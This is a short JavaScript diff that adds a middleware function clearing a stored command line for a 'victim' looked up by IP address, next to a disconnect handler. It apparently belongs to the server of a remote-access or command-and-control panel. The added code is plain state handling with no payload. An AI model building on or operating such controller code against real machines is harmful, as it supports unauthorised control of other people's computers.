@@ -115,6 +115,17 @@ module.exports = {
         next();
     },
 
+    clearCommandLine(req, res, next){
+        let victim = getVictim(req.params.ip);
+
+        if (!victim){
+            return res.redirect(303, '/');
+        }
+        victim.commandLine = '';
+
+        next();
+    },
+
     disconnect(req, res, next){
         let victim = getVictim(req.params.ip);
 
